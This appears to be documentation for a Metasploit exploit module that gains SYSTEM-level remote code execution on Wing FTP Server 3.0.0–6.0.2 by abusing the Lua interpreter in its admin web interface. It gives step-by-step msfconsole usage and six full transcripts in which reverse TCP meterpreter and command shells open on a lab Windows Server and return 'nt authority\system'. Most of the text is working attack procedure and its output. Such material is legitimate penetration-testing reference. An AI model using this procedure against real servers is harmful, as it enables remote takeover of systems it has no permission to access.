## Description ##

This module exploits the embedded Lua interpreter in the admin web interface for versions 3.0.0 and above of Wing FTP Server. When supplying a specially crafted HTTP POST request an attacker can use os.execute() to execute arbitrary system commands on the target with SYSTEM privileges.

Only versions of Wing FTP Server after 3.0.0 ship with the Lua interpreter and the admin web interface. This makes versions < 3.0.0 most probably NOT vulnerable to this exploit, simply due to the fact that they do not have the capability execute commands this way.

Version 6.0.2 handles URL encoding differently compared to version 4.3.8. This makes CmdStager fail (as it contains characters that cannot simply be base64 encoded, unlike PowerShell), so the use CmdStager against version 6.0.2 is strongly discouraged. Run `check` first before exploiting.

The full changelog for Wing FTP Server can be found at [https://www.wftpserver.com/serverhistory.htm].

Information about the admin web interface can be found at [https://www.wftpserver.com/help/ftpserver/index.html?administrator_console.htm].

## Vulnerable application ##

3.0.0 <= Wing FTP Server Version <= 6.0.2

## Verification Steps ##

1. Start `msfconsole`
2. Do `use exploit/windows/ftp/wing_ftp_admin_exec`
3. Do `set RHOST <target-ip>`
4. Do `set USERNAME <valid-username>`
5. Do `set PASSWORD <valid-password>`
6. Optional: Do `set PAYLOAD windows/<your-preferred-shell>` (default is `windows/meterpreter/reverse_tcp`)
7. Do `set LHOST <your-ip>`
8. Optional: Do `set TARGET <target>` to specify whether PowerShell/CmdStager will be used (default and recommended is `PowerShell`)
9. Do `exploit`
10. Verify that a shell of your specified type (Meterpreter, plain old shell, etc.) pops

## Tested with Wing FTP Server 4.3.8 and 6.0.2, installed on Windows Server 2016 Datacenter x64 ##

### With PowerShell using x64 meterpreter against version 6.0.2 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 6.0.2: appears vulnerable.
[*] Executing payload via Powershell...
[*] Sending stage (206403 bytes) to 192.168.136.151
[*] Meterpreter session 6 opened (192.168.136.146:4444 -> 192.168.136.151:1879) at 2018-12-10 01:44:40 +0800

meterpreter > sysinfo
Computer        : 2K16DTCTR
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

### with PowerShell using x86 shell_reverse_tcp against version 6.0.2 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 6.0.2: appears vulnerable.
[*] Executing payload via Powershell...
[*] Command shell session 7 opened (192.168.136.146:4444 -> 192.168.136.151:1881) at 2018-12-10 01:45:18 +0800



C:\Windows\system32>whoami & hostname & systeminfo
whoami & hostname & systeminfo
nt authority\system
2K16DTCTR

Host Name:                 2K16DTCTR
OS Name:                   Microsoft Windows Server 2016 Datacenter
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
<... snip ...>
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.136.254
                                 IP address(es)
                                 [01]: 192.168.136.151
                                 [02]: fe80::8cb0:9bf1:fefe:5fbd
                           [02]: Microsoft KM-TEST Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 Status:          Hardware not present
<... snip ...>
```
### with PowerShell using x64 meterpreter against version 4.3.8 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 4.3.8: appears vulnerable.
[*] Executing payload via Powershell...
[*] Sending stage (206403 bytes) to 192.168.136.151
[*] Meterpreter session 8 opened (192.168.136.146:4444 -> 192.168.136.151:1886) at 2018-12-10 01:47:06 +0800

meterpreter > sysinfo
Computer        : 2K16DTCTR
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

### with PowerShell using x86 shell_reverse_tcp against version 4.3.8 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 4.3.8: appears vulnerable.
[*] Executing payload via Powershell...
[*] Command shell session 9 opened (192.168.136.146:4444 -> 192.168.136.151:1889) at 2018-12-10 01:48:02 +0800



C:\Windows\system32>whoami & hostname & systeminfo
whoami & hostname & systeminfo
nt authority\system
2K16DTCTR

Host Name:                 2K16DTCTR
OS Name:                   Microsoft Windows Server 2016 Datacenter
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
<... snip ...>
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.136.254
                                 IP address(es)
                                 [01]: 192.168.136.151
                                 [02]: fe80::8cb0:9bf1:fefe:5fbd
                           [02]: Microsoft KM-TEST Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 Status:          Hardware not present
<... snip ...>
```

### with CmdStager using x64 meterpreter against version 4.3.8 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > set TARGET CmdStager 
TARGET => CmdStager
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 4.3.8: appears vulnerable.
[*] Sending payload
[*] Command Stager progress -  12.42% done (1499/12068 bytes)
[*] Command Stager progress -  24.84% done (2998/12068 bytes)
[*] Command Stager progress -  37.26% done (4497/12068 bytes)
[*] Command Stager progress -  49.69% done (5996/12068 bytes)
[*] Command Stager progress -  62.11% done (7495/12068 bytes)
[*] Command Stager progress -  74.53% done (8994/12068 bytes)
[*] Command Stager progress -  86.53% done (10442/12068 bytes)
[*] Command Stager progress -  98.75% done (11917/12068 bytes)
[*] Sending stage (206403 bytes) to 192.168.136.151
[*] Command Stager progress - 100.00% done (12068/12068 bytes)
[*] Meterpreter session 10 opened (192.168.136.146:4444 -> 192.168.136.151:1893) at 2018-12-10 01:49:32 +0800

meterpreter > sysinfo
Computer        : 2K16DTCTR
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

### With CmdStager using x86 shell_reverse_tcp against version 4.3.8 ###

```
msf > use exploit/windows/ftp/wing_ftp_admin_exec
msf exploit(windows/ftp/wing_ftp_admin_exec) > set RHOST 192.168.136.151
RHOST => 192.168.136.151
msf exploit(windows/ftp/wing_ftp_admin_exec) > set USERNAME admin
USERNAME => admin
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PASSWORD password
PASSWORD => password
msf exploit(windows/ftp/wing_ftp_admin_exec) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(windows/ftp/wing_ftp_admin_exec) > set LHOST 192.168.136.146
LHOST => 192.168.136.146
msf exploit(windows/ftp/wing_ftp_admin_exec) > set TARGET CmdStager 
TARGET => CmdStager
msf exploit(windows/ftp/wing_ftp_admin_exec) > exploit

[*] Started reverse TCP handler on 192.168.136.146:4444 
[*] Authenticating...
[+] Wing FTP Server 4.3.8: appears vulnerable.
[*] Sending payload
[*] Command Stager progress -   1.47% done (1499/102292 bytes)
[*] Command Stager progress -   2.93% done (2998/102292 bytes)
[*] Command Stager progress -   4.40% done (4497/102292 bytes)
<... snip ...>
[*] Command Stager progress -  99.55% done (101827/102292 bytes)
[*] Command Stager progress - 100.00% done (102292/102292 bytes)
[*] Command shell session 11 opened (192.168.136.146:4444 -> 192.168.136.151:1897) at 2018-12-10 01:50:56 +0800



C:\Windows\system32>whoami & hostname & systeminfo
whoami & hostname & systeminfo
nt authority\system
2K16DTCTR

Host Name:                 2K16DTCTR
OS Name:                   Microsoft Windows Server 2016 Datacenter
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
<... snip ...>
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.136.254
                                 IP address(es)
                                 [01]: 192.168.136.151
                                 [02]: fe80::8cb0:9bf1:fefe:5fbd
                           [02]: Microsoft KM-TEST Loopback Adapter
                                 Connection Name: Npcap Loopback Adapter
                                 Status:          Hardware not present
<... snip ...>
```
